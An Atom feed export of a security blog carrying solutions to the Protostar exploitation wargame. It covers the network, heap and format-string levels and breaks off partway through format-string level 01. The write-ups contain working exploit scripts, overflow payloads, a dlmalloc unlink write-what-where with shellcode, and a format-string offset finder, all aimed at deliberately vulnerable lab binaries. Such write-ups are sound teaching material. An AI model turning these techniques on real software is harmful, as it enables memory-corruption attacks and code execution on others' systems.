<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: vulnhub | ]]></title>
  <link href="http://hatRiot.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
  <link href="http://hatRiot.github.io/"/>
  <updated>2018-05-18T09:39:16-07:00</updated>
  <id>http://hatRiot.github.io/</id>
  <author>
    <name><![CDATA[Bryan Alexander]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Protostar solutions - Network]]></title>
    <link href="http://hatRiot.github.io/blog/2014/11/23/protostar-network/"/>
    <updated>2014-11-23T13:10:04-08:00</updated>
    <id>http://hatRiot.github.io/blog/2014/11/23/protostar-network</id>
    <content type="html"><![CDATA[<p>Previous posts:</p>

<p><a href="http://hatriot.github.io/blog/2013/03/31/protostar-solutions-stack-levels/">Protostar &ndash; Stack</a><br/>
<a href="http://hatriot.github.io/blog/2014/09/16/protostar-format-strings/">Protostar &ndash; Format String</a><br/>
<a href="http://hatriot.github.io/blog/2014/09/21/protostar-heap-exploits/">Protostar &ndash; Heap</a></p>

<p>The network stages were pretty simple and emphasized more on data representation, rather than remote exploitation.</p>

<h2>Network 00</h2>

<p>The network levels all have binaries running on the system on various ports.  The first level runs on port 2999.  We can attach to the process with gdb and send over some junk data:</p>

<p>```</p>

<h1>echo &ldquo;xxxx&rdquo; | nc 192.168.1.106 2999</h1>

<p>Please send &lsquo;652467094&rsquo; as a little endian 32bit int
I&rsquo;m sorry, you sent 2021161080 instead
```</p>

<p>Looking at the <a href="https://exploit-exercises.com/protostar/net0/">source code</a>, we want to send a string that, when cast to an unsigned integer, equals some random value.  To do this, we simply open up a socket to the listener, read in the number, transform it to little endian, and send it back.  Using a bit of Python-fu we quickly arrive at a solution:</p>

<p>```
import socket
import struct
import sys
from re import findall</p>

<p>try:</p>

<pre><code>sock = socket.socket()
sock.connect(('192.168.1.106', 2999))

data = sock.recv(256)

m = findall("Please send '(.*?)' as", data)
if len(m) &gt; 0:
    m = int(m[0])
else:
    print 'No data received?'
    sys.exit(1)

print 'Swapping %s to little endian 32bit int' % m
swapped = struct.pack('&lt;Q', m)

print 'Swapped to %s' % repr(swapped)
sock.sendall(str(swapped))

data = sock.recv(512)
print data
</code></pre>

<p>except Exception, e:</p>

<pre><code>print e
</code></pre>

<p>finally:</p>

<pre><code>sock.close()
</code></pre>

<p>```</p>

<p>And when ran:</p>

<p>```</p>

<h1>python protostar_net0.py</h1>

<p>Swapping 1295208340 to little endian 32bit int
Swapped to &lsquo;\x94O3M\x00\x00\x00\x00&rsquo;
Thank you sir/madam
```</p>

<h2>Network 01</h2>

<p>This stage simply requires us to unpack an unsigned integer:</p>

<p>```
 unsigned int wanted;</p>

<p>  wanted = random();</p>

<p>  sprintf(fub, &ldquo;%d&rdquo;, wanted);</p>

<p>  if(write(0, &amp;wanted, sizeof(wanted)) != sizeof(wanted)) {</p>

<pre><code>  errx(1, ":(\n");
</code></pre>

<p>  }
```</p>

<p>Trivially accomplished with some struct packing:</p>

<p>```
import socket
import struct</p>

<p>try:</p>

<pre><code>sock = socket.socket()
sock.connect(('192.168.1.106', 2998))

data = sock.recv(256)

swapped = str(struct.unpack('&lt;I', data)[0])
print swapped
sock.sendall(swapped + '\r\n')
print sock.recv(256)
</code></pre>

<p>except Exception, e:</p>

<pre><code>print e
</code></pre>

<p>finally:</p>

<pre><code>sock.close()
</code></pre>

<p>```</p>

<p>Which gives us:</p>

<p>```</p>

<h1>python protostar_net1.py</h1>

<p>1413209085
you correctly sent the data
```</p>

<h2>Network 02</h2>

<p>The third network level tasks us with reading in 4 unsigned integers, adding them together, and sending back the result.  The &ldquo;trick&rdquo; in this stage, if you will, is that uint32 arithmetic needs to take into account wrapping.  To accomplish this, we want our result to never be negative, which requires us to define the result modulo 2<sup>n</sup>, where n = bit length.</p>

<p>This makes for a pretty simple stage:</p>

<p>```
import struct
import socket</p>

<p>try:</p>

<pre><code>sock = socket.socket()
sock.connect(('192.168.1.106', 2997))

# read in our four numbers
total = 0
for i in xrange(4):
    n = sock.recv(4)
    n = struct.unpack('&lt;I', n)[0]
    print 'Read digit %d' % n
    total += n

total = total &amp; 0xffffffffL
total = struct.pack('&lt;I', total)
sock.sendall(total)
print sock.recv(256)
</code></pre>

<p>except Exception, e:</p>

<pre><code>print e
</code></pre>

<p>finally:</p>

<pre><code>sock.close()
</code></pre>

<p>```</p>

<p>Note that we AND the final result by 2<sup>n</sup>, ensuring we have a positive 32 bit value.</p>

<p>When run:</p>

<p>```</p>

<h1>python protostar_net2.py</h1>

<p>Read digit 1533721612
Read digit 363484815
Read digit 1200915436
Read digit 1572177737
you added them correctly</p>

<p>```</p>

<h2>Network 03</h2>

<p>The most enjoyable of the four levels, this stage requires us to reverse a dead simple login routine and perform the login.  We&rsquo;ll start by checking out the code and figuring out what it&rsquo;s doing:</p>

<p>```
while(1) {</p>

<pre><code>  // from the connection, read in the total length of the packet, then
  // parse with ntohs and allocate the buffer with malloc
  nread(fd, &amp;len, sizeof(len));
  len = ntohs(len);
  buffer = malloc(len);

  if(! buffer) errx(1, "malloc failure for %d bytes", len);

  // read in LEN bytes into BUFFER
  nread(fd, buffer, len);
</code></pre>

<p>```</p>

<p>I&rsquo;ve commented the code inline to ease understanding.  Essentially, the first byte of our packet must be the total length of the packet.</p>

<p>```
  // switch on the first byte of the buffer
  switch(buffer[0]) {</p>

<pre><code>      // if the first byte is \x17, initiate login routine
      case 23:
          // invoke login() with buffer + 1 (skip length byte) and total len - 1 of the packet
          loggedin = login(buffer + 1, len - 1);
          send_string(fd, 33, loggedin ? "successful" : "failed");
          break;

      default:
          send_string(fd, 58, "what you talkin about willis?");
          break;
  }
</code></pre>

<p>```</p>

<p>If the first byte of the buffer (second in the packet) is \x17, it initiates login.</p>

<p>```
  deduct = get_string(&amp;resource, buffer, len);
  deduct += get_string(&amp;username, buffer+deduct, len-deduct);
  deduct += get_string(&amp;password, buffer+deduct, len-deduct);</p>

<p>  success = 0;
  success |= strcmp(resource, &ldquo;net3&rdquo;);
  success |= strcmp(username, &ldquo;awesomesauce&rdquo;);
  success |= strcmp(password, &ldquo;password&rdquo;);
```</p>

<p>Here&rsquo;s the real meat of the login routine; we need three, null-terminated strings that match &ldquo;net3&rdquo;, &ldquo;awesomesauce&rdquo;, and &ldquo;password&rdquo;, respectively, to successfully authenticate to the application.  The <code>get_string</code> fuction pulls these strings out one by one:</p>

<p>```
  unsigned char byte;</p>

<p>  byte = *buffer;</p>

<p>  // if it&rsquo;s malformed, i.e. not null term&rsquo;d
  if(byte > len) errx(1, &ldquo;badly formed packet&rdquo;);</p>

<p>  // malloc size of byte, which is the first byte at the start of the buffer
  *result = malloc(byte);</p>

<p>  // strcpy buffer + 1 into the result pointer location
  strcpy(*result, buffer + 1);</p>

<p>  // return number of bytes read
  return byte + 1;
```</p>

<p>The caveat here is that we need to prepend the string length to each entry, then null terminate it.  This was quite simple to hack up, once it&rsquo;d been reversed:</p>

<p>```
import struct
import socket</p>

<p>IP = &lsquo;192.168.1.106&rsquo;
PORT = 2996</p>

<p>try:</p>

<pre><code>sock = socket.socket()
sock.connect((IP, PORT))

resource = "net3\x00"
username = "awesomesauce\x00"
password = "password\x00"

# build login packet 
packet = struct.pack('B', 23)
packet += struct.pack('B', len(resource)) + resource
packet += struct.pack('B', len(username)) + username
packet += struct.pack('B', len(password)) + password
packet_len = struct.pack('&gt;H', len(packet))

print '[!] Sending packet (%d)' % (len(packet) + len(packet_len))

sock.sendall(packet_len + packet)

print sock.recv(128)
</code></pre>

<p>except Exception, e:</p>

<pre><code>print e
</code></pre>

<p>finally:</p>

<pre><code>sock.close()
</code></pre>

<p>```</p>

<p>Note that we&rsquo;re sending the packet length big endian due to the <code>ntohs</code> call returning a little endian value.  And once run:</p>

<p>```</p>

<h1>python protostar_net3.py</h1>

<p>[!] Sending packet (33)</p>

<p>!successful
```</p>

<h2>Network 04</h2>

<p>Although net04 is not listed anywhere on the site, I noticed that it was both running and available in the <code>/opt/protostar/bin</code> directory.  Disassembling it reveals the answer:</p>

<p><code>
 80497a8:   e8 ff f3 ff ff          call   8048bac &lt;srandom@plt&gt;
 80497ad:   8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
 80497b1:   89 04 24                mov    DWORD PTR [esp],eax
 80497b4:   e8 a1 ff ff ff          call   804975a &lt;run&gt;
</code></p>

<p><main> does exactly what the rest of the stages have done: backgrounding the process as the current user, serving the socket up indefinitely, changing STDIO, and invoking run().  However, stage fours run is a big nop:</p>

<p><code>
0804975a &lt;run&gt;:
 804975a:   55                      push   ebp
 804975b:   89 e5                   mov    ebp,esp
 804975d:   5d                      pop    ebp
 804975e:   c3                      ret  
</code></p>

<p>Not so much of a stage!  On to the final stages.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar solutions - Heap Exploitation]]></title>
    <link href="http://hatRiot.github.io/blog/2014/09/21/protostar-heap-exploits/"/>
    <updated>2014-09-21T14:10:04-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/09/21/protostar-heap-exploits</id>
    <content type="html"><![CDATA[<p>And we&rsquo;re back with Protostar, this time working on the heap section.</p>

<h2>Heap Exploits 0</h2>

<p>Introductory level that demonstrates overflowing heap structures.  It&rsquo;s pretty simple:</p>

<p><code>
user@protostar:/opt/protostar/bin$ objdump -dt heap0 | grep winner
08048464 g     F .text  00000014              winner
08048478 g     F .text  00000014              nowinner
08048464 &lt;winner&gt;:
08048478 &lt;nowinner&gt;:
</code></p>

<p>And then we find our EIP offset:</p>

<p>```
(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>72 + &ldquo;B&rdquo;</em>4&rsquo;)
Starting program: /opt/protostar/bin/heap0 $(python -c &lsquo;print &ldquo;A&rdquo;<em>72 + &ldquo;B&rdquo;</em>4&rsquo;)
data is at 0x804a008, fp is at 0x804a050</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```</p>

<p>Using our mad exploit skills:</p>

<p><code>
$ ./heap0 $(python -c 'print "A"*72 + "\x64\x84\x04\x08"')
data is at 0x804a008, fp is at 0x804a050
level passed
</code></p>

<h2>Heap Exploits 1</h2>

<p>This challenge dives a bit more into heap exploitation with a nice write-what-where, and the goal is to redirect execution flow to the function <code>winner</code>.  Let&rsquo;s find that first:</p>

<p><code>
$ objdump -dt heap1 | grep winner
08048494 g     F .text  00000025              winner
</code></p>

<p>Now let&rsquo;s check out the actual bug:</p>

<p>```
(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;B&rdquo;</em>4&rsquo;) xx
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/heap1 $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;B&rdquo;</em>4&rsquo;) xx</p>

<p>Program received signal SIGSEGV, Segmentation fault.
*__GI_strcpy (dest=0x42424242 <Address 0x42424242 out of bounds>, src=0xbffff9a3 &ldquo;xx&rdquo;) at strcpy.c:40
40  strcpy.c: No such file or directory.</p>

<pre><code>in strcpy.c
</code></pre>

<p>```</p>

<p>As we can see, we control the source (argument two) and the destination, address one, which is the result of a pointer overflow in the following code:</p>

<p><code>
strcpy(i1-&gt;name, argv[1]);
strcpy(i2-&gt;name, argv[2]);
</code></p>

<p>We have a couple of options for exploitation, but I chose to simply overwrite ebp+4 to take control over the return address.  Let&rsquo;s find that first:</p>

<p>```
(gdb) b *0x08048566
Breakpoint 1 at 0x8048566: file heap1/heap1.c, line 35.
(gdb) r xx yy
Starting program: /opt/protostar/bin/heap1 xx yy
and that&rsquo;s a wrap folks!</p>

<p>Breakpoint 1, main (argc=3, argv=0xbffff864) at heap1/heap1.c:35
35  heap1/heap1.c: No such file or directory.</p>

<pre><code>in heap1/heap1.c
</code></pre>

<p>(gdb) x/wx $ebp
0xbffff7b8: 0xbffff838
```</p>

<p>This shows ebp is located at 0xbffff7b8, so let&rsquo;s overwrite that:</p>

<p>```
(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;\x98\xf7\xff\xbf&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;A&rdquo;</em>4 + &ldquo;B&rdquo;<em>4&rsquo;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/heap1 $(python -c &lsquo;print &ldquo;A&rdquo;</em>20 + &ldquo;\x98\xf7\xff\xbf&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;A&rdquo;<em>4 + &ldquo;B&rdquo;</em>4&rsquo;)
and that&rsquo;s a wrap folks!</p>

<p>Breakpoint 1, main (argc=0, argv=0xbffff844) at heap1/heap1.c:35
35  in heap1/heap1.c
(gdb) x/wx $ebp
0xbffff798: 0x41414141
(gdb) x/wx $ebp+4
0xbffff79c: 0x42424242
(gdb)
```</p>

<p>Note that ebp&rsquo;s address changed; this is a stupid method and is susceptible to stack shifting, so we need to ensure we accomodate for that.  Anyway, now we can control where we return to, so let&rsquo;s pop in our winning address:</p>

<p>```
(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;\x98\xf7\xff\xbf&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;A&rdquo;</em>4 + &ldquo;\x94\x84\x04\x08&rdquo;&rsquo;)</p>

<p>Breakpoint 1, main (argc=0, argv=0xbffff844) at heap1/heap1.c:35
35  in heap1/heap1.c
(gdb) x/wx $ebp
0xbffff798: 0x41414141
(gdb) x/wx $ebp+4
0xbffff79c: 0x08048494
(gdb) c
Continuing.
and we have a winner @ 1410933753</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
(gdb)
```</p>

<p>And that&rsquo;s all!  Notice we still segfault, this is because we&rsquo;ve totally screwed up the stack, and it&rsquo;s trying to pop another value off the stack and return there.  We can trivally fix that by appending the address for exit:</p>

<p>```
(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;\x98\xf7\xff\xbf&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;A&rdquo;</em>4 + &ldquo;\x94\x84\x04\x08&rdquo; + &ldquo;\xc0\x60\xec\xb7&rdquo;&rsquo;)
Starting program: /opt/protostar/bin/heap1 $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;\x98\xf7\xff\xbf&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;A&rdquo;</em>4 + &ldquo;\x94\x84\x04\x08&rdquo; + &ldquo;\xc0\x60\xec\xb7&rdquo;&rsquo;)
and that&rsquo;s a wrap folks!
and we have a winner @ 1410933890</p>

<p>Program exited with code 0124.
(gdb)
```</p>

<h2>Heap Exploits 2</h2>

<p>This one is pretty simple, and doesn&rsquo;t require us to really exploit much.  What we have is basically a contrived authentication service that&rsquo;s got four commands: auth, reset, service, and login.  The goal is to trigger the &ldquo;you have logged in already!&rdquo; message.  Here&rsquo;s the solution:</p>

<p><code>
user@protostar:/opt/protostar/bin$ ./heap2
[ auth = (nil), service = (nil) ]
auth xx
[ auth = 0x804c008, service = (nil) ]
service xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
</code></p>

<p>First we auth, which allocates the auth structure:</p>

<p>```
if(strncmp(line, &ldquo;auth &rdquo;, 5) == 0) {
  auth = malloc(sizeof(auth));
  memset(auth, 0, sizeof(auth));
  if(strlen(line + 5) &lt; 31) {</p>

<pre><code>strcpy(auth-&gt;name, line + 5);
</code></pre>

<p>  }
}
```</p>

<p>Then we execute service with a long string:</p>

<p>```
if(strncmp(line, &ldquo;service&rdquo;, 6) == 0) {</p>

<pre><code>  service = strdup(line + 7);
</code></pre>

<p>}
```</p>

<p>strdup duplicates a string, allocated via malloc.  Note in the auth struct allocation that it&rsquo;s only allocating <code>sizeof(auth)</code>.  This is an incorrect allocation, as it&rsquo;s really just allocating memory for a struct <em>pointer</em>, and not the 30 odd bytes for the structure.  We can easily demonstrate this with multiple auth struct allocations:</p>

<p><code>
$ ./heap2
[ auth = (nil), service = (nil) ]
auth 1
[ auth = 0x804c008, service = (nil) ]
auth 2
[ auth = 0x804c018, service = (nil) ]
</code></p>

<p>This 16 byte difference is comprised solely of chunk headers.  All we need to do is set the auth flag in the struct to some non-zero value, which can be done with the service command and our arbitrarily long string allocation.</p>

<p>```
if(strncmp(line, &ldquo;login&rdquo;, 5) == 0) {</p>

<pre><code>if(auth-&gt;auth) {
  printf("you have logged in already!\n");
} else {
  printf("please enter your password\n");
}
</code></pre>

<p>  }
```</p>

<h2>Heap Exploits 3</h2>

<p>This is the level that I thought more of these would be; this level requires us to manipulate heap metadata in order to obtain code execution.  Whilst this method is terribly outdated and not applicable at all to modern heaps, it&rsquo;s still a blast, and many of the high level methods still apply.</p>

<p>I highly, highly recommend reading the essential <a href="http://phrack.org/issues/57/9.html"><em>Once Upon A Free()</em></a> if you&rsquo;re unfamiliar with old school, dlmalloc heap exploitation, as there is quite a bit of prerequisite knowledge necessary to complete this stage.  I&rsquo;ll assume the reader has a cursory understanding of how this process will go down.</p>

<p>Much like the previous stages, we need to redirect the program to another function, <code>winner</code>.  Stage 3 executes three separate, 32 byte malloc&rsquo;s, strcpy&rsquo;s our input into each chunk, then free&rsquo;s them in <a href="http://webcache.googleusercontent.com/search?q=cache:TddtBQ76DO4J:exploit-exercises.com/protostar/heap3+&amp;cd=11&amp;hl=en&amp;ct=clnk&amp;gl=us">reverse</a>:</p>

<p>```
a = malloc(32);
b = malloc(32);
c = malloc(32);</p>

<p>strcpy(a, argv[1]);
strcpy(b, argv[2]);
strcpy(c, argv[3]);</p>

<p>free&copy;;
free(b);
free(a);
```</p>

<p>Let&rsquo;s first check out the memory layout.  After all three allocations and strcpy&rsquo;s, but before any free&rsquo;s:</p>

<p><code>
(gdb) x/10wx 0x804c008-8
0x804c000:  0x00000000  0x00000029  0x41414141  0x00000000
0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c020:  0x00000000  0x00000000
(gdb) x/10wx 0x804c030-8
0x804c028:  0x00000000  0x00000029  0x42424242  0x00000000
0x804c038:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c048:  0x00000000  0x00000000
(gdb) x/10wx 0x804c058-8
0x804c050:  0x00000000  0x00000029  0x43434343  0x00000000
0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c070:  0x00000000  0x00000000
(gdb)
</code></p>

<p>Recall that each chunk has metadata in-channel that allows dlmalloc to traverse, coalesce, and fetch chunks on the heap.  In the above case, three allocated chunks have two requisite fields: <code>prev_size</code> and <code>size</code>.  As none of the previous chunks in the heap have been free&rsquo;d, the<code>prev_size</code> field is 0x0.  The size field is 0x29, or 41.  The lower three bits are reserved in this field, so accounting for that:</p>

<p><code>
(gdb) p/d 0x29 &amp; ~3
$1 = 40
(gdb)      
</code></p>

<p>These three chunks are then free&rsquo;d in reverse order, starting from chunk c.  Exploitation for this rather straight forward, we just need to overflow adjacent metadata headers to craft an illicit chunk.  Once free enters its unlink macro, we obtain execution flow control.</p>

<p>We need to start by setting the <code>prev_size</code> and <code>size</code> fields to values that allow us to control forward and backward chunk pointers.  We begin by setting both fields to 0xffffffc, or -4.</p>

<p>```
(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>32 + &ldquo;\xfc\xff\xff\xff&rdquo;</em>2&rsquo;) BBBB CCCC
Starting program: /opt/protostar/bin/heap3 $(python -c &lsquo;print &ldquo;A&rdquo;<em>32 + &ldquo;\xfc\xff\xff\xff&rdquo;</em>2&rsquo;) BBBB CCCC</p>

<p>Breakpoint 1, 0x08048911 in main (argc=4, argv=0xbffff824) at heap3/heap3.c:24
24  in heap3/heap3.c
(gdb) x/10wx 0x804c030-8
0x804c028:  0xfffffffc  0xfffffffc  0x42424242  0x00000000
0x804c038:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c048:  0x00000000  0x00000000
```</p>

<p>We now shift to setting the flink and blink values, which are set once a chunk is freed.  Let&rsquo;s inspect these chunks after all three have been freed:</p>

<p><code>
(gdb) x/10wx 0x804c008-8
0x804c000:  0x00000000  0x00000029  0x0804c028  0x00000000
0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c020:  0x00000000  0x00000000
(gdb) x/10wx 0x804c030-8
0x804c028:  0x00000000  0x00000029  0x0804c050  0x00000000
0x804c038:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c048:  0x00000000  0x00000000
(gdb) x/10wx 0x804c058-8
0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
0x804c070:  0x00000000  0x00000000
</code></p>

<p>The value after the <code>size</code> field is a forward pointer to the next free chunk.  There would typically be another pointer in the next field, a backwards link, however, dlmalloc employs what&rsquo;s known as fastbins.  This is a singly-linked list holding recently freed small chunks ( &lt; 64 bytes).  More on this can be found <a href="ftp://g.oswego.edu/pub/misc/malloc-2.7.0.c">here</a>.</p>

<p>Taking a quick peek at the exploitable unlink macro:</p>

<p>```</p>

<h1>define unlink(P, BK, FD)</h1>

<p>{
  BK = P->bk;
  FD = P->fd;
  FD->bk = BK;
  BK->fd = FD;
}
```
This macro will essentially update chunk pointers to, naturally, unlink a recently freed chunk.  This boils down to:</p>

<p><code>
*(next-&gt;fd + 12) = next-&gt;bk
*(next-&gt;bk + 8) = next-&gt;fd
</code></p>

<p>A simple write-what-where.  If we set fd to <code>return address - 0xc</code>, or the where, then bk is the what and ends up being the value popped into EIP.  Let&rsquo;s test this out by attempting to write 0x42424242 into chunk A:</p>

<p>```
(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>32 + &ldquo;\xfc\xff\xff\xff&rdquo;</em>2&rsquo;) $(python -c &lsquo;print &ldquo;B&rdquo;<em>4 + &ldquo;\xfc\xbf\x04\x08&rdquo; + &ldquo;B&rdquo;</em>4&rsquo;) CCCC
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/heap3 $(python -c &lsquo;print &ldquo;A&rdquo;<em>32 + &ldquo;\xfc\xff\xff\xff&rdquo;</em>2&rsquo;) $(python -c &lsquo;print &ldquo;B&rdquo;<em>4 + &ldquo;\xfc\xbf\x04\x08&rdquo; + &ldquo;B&rdquo;</em>4&rsquo;) CCCC</p>

<p>Breakpoint 1, 0x08048911 in main (argc=4, argv=0xbffff814) at heap3/heap3.c:24
24  in heap3/heap3.c
(gdb) ni 3</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x08049906 in free (mem=0x804c030) at common/malloc.c:3638
3638    common/malloc.c: No such file or directory.
in common/malloc.c
(gdb) x/10wx 0x804c008-8
0x804c000:  0x00000000  0x00000029  0x42424242  0x41414141
0x804c010:  0x41414141  0x41414141  0x41414141  0x41414141
0x804c020:  0x41414141  0x41414141
(gdb)
```</p>

<p>So we can write a controlled value somewhere.  We&rsquo;ll take the path of least resistance for exploitation and overwrite the GOT entry for puts with the location of our shellcode, which will be a simple jump to the appropriate function.</p>

<p><code>
$ objdump -t --dynamic-relo ./heap3 | grep puts
0804b128 R_386_JUMP_SLOT   puts
</code></p>

<p>and winner:</p>

<p><code>
(gdb) p winner
$2 = {void (void)} 0x8048864 &lt;winner&gt;
</code></p>

<p>Since our return address needs to be at an offset of -0xc, we&rsquo;ll be using <code>0x804b11c</code> as the return address.  It is also worth noting that the first field of the chunk is clobbered during the free routine, so we&rsquo;ll need an offset of +4 there as well.</p>

<p>```
(gdb) r AAAA$(python -c &lsquo;print &ldquo;A&rdquo;<em>28 + &ldquo;\xfc\xff\xff\xff&rdquo; + &ldquo;\xfc\xff\xff\xff&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;\x41&rdquo;</em>4 + &ldquo;\x1c\xb1\x04\x08&rdquo; + &ldquo;\x0c\xc0\x04\x08&rdquo;&rsquo;) CCCC
The program being debugged has been started already.
Start it from the beginning? (y or n) y</p>

<p>Starting program: /opt/protostar/bin/heap3 AAAA$(python -c &lsquo;print &ldquo;A&rdquo;<em>28 + &ldquo;\xfc\xff\xff\xff&rdquo; + &ldquo;\xfc\xff\xff\xff&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;\x41&rdquo;</em>4 + &ldquo;\x1c\xb1\x04\x08&rdquo; + &ldquo;\x0c\xc0\x04\x08&rdquo;&rsquo;) CCCC</p>

<p>Breakpoint 1, 0x08048935 in main (argc=4, argv=0xbffff814) at heap3/heap3.c:24
24  heap3/heap3.c: No such file or directory.</p>

<pre><code>in heap3/heap3.c
</code></pre>

<p>(gdb) x/i $eip
0x8048935 &lt;main+172>:   call   0x8048790 &lt;puts@plt>
(gdb) si
0x08048790 in puts@plt ()
(gdb) x/i $eip
0x8048790 &lt;puts@plt>:   jmp    DWORD PTR ds:0x804b128
(gdb) ni
0x0804c00c in ?? ()
(gdb) x/wx $eip
0x804c00c:  0x41414141
(gdb)
```</p>

<p>This gives us about eight bytes until the clobbered field, but this is sufficient for our purposes.  Using metasm, we can generate shellcode for a simple <code>call winner</code>:</p>

<p><code>
metasm &gt; push 0x08048864; ret
"\x68\x64\x88\x04\x08\xc3"
metasm &gt;
</code></p>

<p><code>
user@protostar:/opt/protostar/bin$ ./heap3 AAAA$(python -c 'print "\x68\x64\x88\x04\x08\xc3" + "A"*22 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"') $(python -c 'print "\x41"*4 + "\x1c\xb1\x04\x08" + "\x0c\xc0\x04\x08"') CCCC
that wasn't too bad now, was it? @ 1411285668
user@protostar:/opt/protostar/bin$
</code></p>

<p>And that&rsquo;s it!  I really wish this level had more dlmalloc exploitation, or post-2004 stuff (see <a href="http://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt">here</a>), but this was fun as is.  Fusion seems to be an advanced version of Protostar, so here&rsquo;s to hoping there&rsquo;s more there.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Protostar solutions - Format String]]></title>
    <link href="http://hatRiot.github.io/blog/2014/09/16/protostar-format-strings/"/>
    <updated>2014-09-16T14:10:04-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/09/16/protostar-format-strings</id>
    <content type="html"><![CDATA[<p>Wow it&rsquo;s been awhile since I&rsquo;ve taken a look at this box.  The last time I was here, I was working on the format string levels.  These levels have been done and documented to death, but hey, they&rsquo;re fun.  So, without further delay, lets begin.</p>

<p>I&rsquo;ll be assuming you know what a format string is, and if not, you can follow allowing with <a href="http://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf">this</a> great paper.</p>

<h2>Format String Level 00</h2>

<p>This level really just points out that vulnerabilities exist in <code>sprintf</code>, and isn&rsquo;t too different from any of the easier stack levels.  All we&rsquo;ve got to do is overwrite an integer on the stack with 0xdeadbeef.  A 64 byte buffer is allocated, our target integer is assigned to 0 (after the allocated buffer), and <code>snprintf</code> invoked.  So 64 bytes of junk followed by 4 bytes should give us&hellip;</p>

<p>```
(gdb) r $(python -c &ldquo;print &lsquo;A&rsquo;<em>64 + &lsquo;\xef\xbe\xad\xde&rsquo;&rdquo;)
Starting program: /opt/protostar/bin/format0 $(python -c &ldquo;print &lsquo;A&rsquo;</em>64 + &lsquo;\xef\xbe\xad\xde&rsquo;&rdquo;)</p>

<p>Breakpoint 1, vuln (string=0xbffff95f &lsquo;A&rsquo; <repeats 64 times>, &ldquo;ﾭ&rdquo;, <incomplete sequence \336>) at format0/format0.c:15
15  in format0/format0.c
(gdb) x/wx &amp;target
0xbffff75c: 0xdeadbeef
(gdb) x/wx &amp;target-4
0xbffff74c: 0x41414141
(gdb) c
Continuing.
you have hit the target correctly :)
```</p>

<h2>Format String Level 01</h2>

<p>Here&rsquo;s the first real format string vulnerability.  In it, <code>printf</code> is called without formatting specifiers, leading to a real format string vulnerability.  Our objective, like before, is to simply overwrite a static target variable, <code>target</code>, with anything.  Due to the variable not being on the local stack frame, we need to overwrite a specific address.  Let&rsquo;s first try and find that variable:</p>

<p><code>
user@protostar:/opt/protostar/bin$ objdump -t format1 | grep target
08049638 g     O .bss   00000004              target
user@protostar:/opt/protostar/bin$
</code></p>

<p>Note that ASLR/PIE is disabled on the system, so we can safely use this address as our writable target.  Now in order to actually write something to this address, we need to traverse the stack until we reach our controlled data, then use the <code>%n</code> to write the number of bytes written into a pointer found on the stack, our data.  I wrote a little script to help me find the offset:</p>

<p>```
import sys
from commands import getoutput</p>

<p>run = &ldquo;/opt/protostar/bin/format1 $(perl -e &lsquo;print \"AAAAAAAA\&rdquo; . \&ldquo;%08x.\"x{0}&rsquo; . \&rdquo;%x\&ldquo;)&rdquo;</p>

<p>print &lsquo;[!] Searching for offset..&rsquo;
for idx in range(1, 15000):</p>

<pre><code>tmp = getoutput(run.format(idx))
tmps = tmp.split('.')[:-1]
if '41414141' in tmps[len(tmps)-1]:
    print '[!] Format found at offset %d' % idx 
    print '[!] String: %s' % run.format(idx)
    break
</code></pre>

<p>```</p>

<p>We accommodate for misaligned addresses by supplying 8 bytes and searching for 4.  When this runs, we get our offset:</p>

<p><code>
user@protostar:/opt/protostar/bin$ python ~/test.py
[!] Searching for offset..
[!] Format found at offset 133
[!] String: /opt/protostar/bin/format1 $(perl -e 'print "AAAAAAAA" . "%08x."x133' . "%x")
user@protostar:/opt/protostar/bin$
</code></p>

<p>All we need to do is get the alignment right, and we&rsquo;ve got our address:</p>

<p>```
